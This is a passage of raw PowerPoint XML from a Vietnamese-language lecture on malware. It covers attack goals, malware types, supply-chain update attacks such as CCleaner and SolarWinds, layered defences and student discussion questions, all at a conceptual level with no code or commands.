              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Người dùng nâng cấp ứng dụng thì bị nhiễm mã độc.</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0297267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Malware</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en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="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Tác động của tấn công</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Người dùng: bị đánh cắp dữ liệu, mất quyền riêng tư, lây lan malware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ứng dụng: bị thay đổi hành vi, giảm độ tin cậy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tổ chức: nguy cơ rò rỉ thông tin, mất uy tín, tổn thất tài chính.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="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Ví dụ thực tế</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>CCleaner Attack (2017): bản cập nhật của phần mềm CCleaner bị cài malware, ảnh hưởng hơn 2 triệu người dùng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>SolarWinds (2020): ứng dụng Orion bị cài mã độc trong bản update → lây nhiễm hàng nghìn tổ chức, bao gồm cả chính phủ Mỹ.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="311233117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6.6.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en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1</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Mục</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tiêu</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của</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tấn</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công</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hệ</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thống</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bằng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Chiếm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quyền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kiểm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soát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phép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kẻ</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tấn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công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điều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khiển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toàn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bộ</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hệ</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thống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từ</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xa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Đánh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cắp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dữ</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liệu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nhạy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cảm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mật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khẩu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tài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liệu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nội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bộ</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thông</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> tin </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>tài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chính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dữ</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liệu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khách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hàng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Làm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gián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đoạn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hoạt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động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gây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treo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hệ</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thống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tấn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công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từ</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chối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dịch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vụ</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DoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Cài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đặt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cửa</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hậu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> (backdoor) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>để</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duy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trì</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truy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cập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lâu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dài</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="106617247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6.6.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vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Phương </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thức tấn công hệ thống bằng Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>a. Virus hệ thống:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Xâm nhập vào các file hệ thống và thay đổi cấu hình quan trọng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khi người dùng khởi động, virus sẽ tự động chạy, phá hủy hoặc thay đổi dữ liệu.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>b. Worm (Sâu máy tính):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tự lây lan qua mạng mà không cần sự can thiệp của người dùng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lợi dụng lỗ hổng hệ thống để nhân bản và chiếm dụng tài nguyên.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="308011230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6.6.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147110" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Phương </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thức tấn công hệ thống bằng Malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>c. Trojan Horse (Ngựa gỗ thành Troy):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ngụy trang dưới dạng phần mềm hợp pháp.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Sau khi cài đặt, kẻ tấn công có thể mở backdoor, đánh cắp dữ liệu.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>d. Rootkit:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ẩn mình sâu trong hệ điều hành, che giấu hoạt động độc hại.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Cho phép kẻ tấn công kiểm soát hệ thống mà người dùng không biết.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>d. Ransomware:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Mã hóa toàn bộ dữ liệu hệ thống.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ép buộc nạn nhân phải trả tiền chuộc để lấy lại quyền truy cập.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="423332085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6.6.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147110"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3. Hậu quả khi hệ thống bị tấn công bởi Malware</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Mất dữ liệu nghiêm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trọng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ây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tổn thất tài chính và danh tiếng.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Bị gián đoạn dịch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vụ</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Ả</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nh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hưởng tới hoạt động kinh doanh và khách hàng.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Chi phí khắc phục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ừ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khôi phục dữ liệu, điều tra, đến tăng cường an ninh.</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Nguy cơ lan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rộn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 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ừ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máy bị nhiễm có thể lây sang toàn bộ hệ thống mạng.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9200156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6.6.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147110"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4</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Biện pháp phòng chống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Cập nhật bản vá hệ thống thường xuyên để loại bỏ lỗ hổng.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Antivirus và EDR (Endpoint Detection &amp; Response).</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Giám sát hệ thống bằng IDS/IPS (Intrusion Detection/Prevention System).</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Phân quyền người dùng hợp lý và áp dụng nguyên tắc “ít quyền nhất” (least privilege).</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Sao lưu dữ liệu định kỳ để giảm thiểu rủi ro từ Ransomware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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66571024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6.7.</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Biện pháp phòng chống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Cập nhật và vá lỗi thường xuyên</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Luôn cập nhật hệ điều hành, phần mềm và ứng dụng để khắc phục các lỗ hổng bảo mật.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Sử dụng công cụ quản lý bản vá (patch management) cho hệ thống lớn.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">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Sử dụng phần mềm bảo mật</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Antivirus/Antimalware: phát hiện, ngăn chặn và loại bỏ mã độc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Firewall (Tường lửa): chặn truy cập trái phép từ bên ngoài.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>IDS/IPS (Intrusion Detection/Prevention System): phát hiện và ngăn chặn hành vi bất thường.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </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4234169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6.7.</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Biện pháp phòng chống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3. Chính sách bảo mật và phân quyền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Áp dụng nguyên tắc ít quyền nhất (Least Privilege) cho tài khoản người dùng.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Giới hạn quyền admin, tránh để người dùng cài đặt phần mềm không rõ nguồn gốc.</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Thiết lập chính sách bảo mật nội bộ nghiêm ngặt.</a:t>
            </a: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4. Sao lưu và phục hồi dữ liệu</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Thực hiện backup định kỳ (hằng ngày, hằng tuần).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Lưu trữ bản sao dữ liệu trên hệ thống riêng biệt hoặc đám mây an toàn.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khả năng khôi phục dữ liệu để sẵn sàng khi có sự cố.</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8801186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6.7.</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Biện pháp phòng chống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5</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Giám sát và phát hiện sớm</a:t>
            </a:r>
          </a:p>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Triển khai SIEM (Security Information and Event Management) để giám sát log hệ thống.</a:t>
            </a:r>
          </a:p>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Phân tích hành vi người dùng (UBA/UEBA) để phát hiện hoạt động bất thường.</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6</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Nâng cao nhận thức người dùng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Tổ chức đào tạo an ninh mạng cho nhân viên.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Cảnh báo về email giả mạo, phishing, file đính kèm độc hại.</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Khuyến khích thói quen an toàn: không tải phần mềm lậu, không click link lạ.</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90832216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6.7.</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Biện pháp phòng chống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7</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bổ sung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sandbox để kiểm tra file nghi ngờ trước khi mở.</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Mã hóa dữ liệu quan trọng để giảm thiểu thiệt hại khi bị đánh cắp.</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Triển khai Zero Trust Security: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hông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tin cậy bất kỳ kết nối nào cho đến khi được xác minh.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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lgn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Phòng chống Malware cần sự kết hợp giữa công nghệ, quy trình, và con người, nhằm tạo ra một hệ thống phòng thủ nhiều lớp (defense-in-depth).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600"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46290174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6.8.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51576" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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Câu</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hỏi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1</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Nhận diện nguy cơ thực tế</a:t>
            </a:r>
          </a:p>
          <a:p>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SV</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đã từng gặp hoặc nghe về một cuộc tấn công bằng malware chưa (ví dụ: WannaCry, ransomware tống tiền, virus máy tính cũ…)?</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Theo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SV</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tại sao chỉ một lỗ hổng nhỏ cũng có thể dẫn đến thiệt hại lớn?</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2</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Kỹ thuật che giấu &amp; phát tán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Trong ba kỹ thuật che giấu (Polymorphism, Metamorphism, Obfuscation), kỹ thuật nào nguy hiểm nhất? Tại sao?</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Theo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SV</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việc malware phát tán qua P2P, email, USB có điểm mạnh/yếu gì?</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71286000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6.8.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Câu</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hỏi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Ứng dụng khai thác (Exploit)</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Khi hacker phát triển mã khai thác, yếu tố nào quyết định tính hiệu quả của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xploit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SV</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nghĩ người dùng phổ thông có thể bị lừa khai thác lỗ hổng mà không hề hay biết không? Ví dụ?</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4</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Phòng chống &amp; ứng phó</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Nếu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SV</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là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quản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trị hệ thống trong một doanh nghiệp, đâu là ưu tiên số 1 khi chống lại malware?</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Ngoài công nghệ (antivirus, firewall, IDS/IPS), vai trò của con người (nhận thức, thói quen) quan trọng như thế nào?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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70536949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6.8.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Câu</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hỏi</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5.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Liên</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DevSecOps</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đại</a:t>
            </a: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Malware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exploit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đặt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ra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thách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thức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gì</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mô</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hình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triển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phần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mềm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toàn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DevSecOps</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Làm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sao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chặn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từ</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sớm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thay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vì</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chỉ</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phản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p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="163346841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87332"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.8.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007001"/>
            <a:ext cx="9901452" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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Tình</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huống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Tình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huống 1: Email lừa đảo</a:t>
            </a:r>
          </a:p>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nhân viên nhận được email từ “ngân hàng” với tệp đính kèm PDF. Sau khi mở, máy tính bắt đầu chậm và có dấu hiệu truy cập mạng bất thường.</a:t>
            </a:r>
